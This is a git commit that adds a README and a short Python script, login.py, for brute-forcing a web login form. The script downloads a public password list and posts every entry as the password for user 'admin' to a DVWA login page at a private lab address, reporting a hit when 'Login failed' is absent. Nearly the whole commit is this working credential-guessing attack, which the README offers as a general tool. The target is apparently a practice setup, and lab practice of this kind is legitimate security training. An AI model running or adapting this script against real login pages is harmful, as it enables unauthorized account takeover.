c8ff4d36c6d60d871ae3ef51a70548b47aa96040
Helton Wernik <heltonwernik@gmail.com>
2018-10-13 23:32:16 +0300

    first commit

--- README.md
+++ README.md
@@ -1,1 +1,3 @@
 # bruteforce-with-online-wordlist
+
+This is a simple brutforce password attack program that does not need any password-list. Which can be done from any operating system without spending storage space. Its uses any internet password list.
---
+++ login.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python
+
+# This is a simple brutforce password attack program that does not need any password-list. which can be done from any operating system without spending storage space. Its uses any internet password list.
+import requests
+import urllib2
+import sys
+
+# Put here the url you want to do a bruteforce
+target_url = "http://172.16.143.128/dvwa/login.php"
+
+# Put here: the name of the element as the key and the value as the value ---- key - the name of the element and the value what you want to put on this input field. 
+# The last is the button element, the key is the "name" of the element and the value is the "type"
+data_dict = {"username": "admin", "password": "", "Login": "submit"}
+
+# Here you can put the url of the any password list
+dictionary_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
+
+for line in urllib2.urlopen(dictionary_url):
+    word = line.strip()
+    data_dict["password"] = word
+    response = requests.post(target_url, data=data_dict)
+    print("\r" + word + "     ")
+    sys.stdout.flush()
+    if "Login failed" not in response.content:
+            print("[+] I have the password --> " + word)
+            exit()
+
+print("[-] Reached end of the line :(")
+
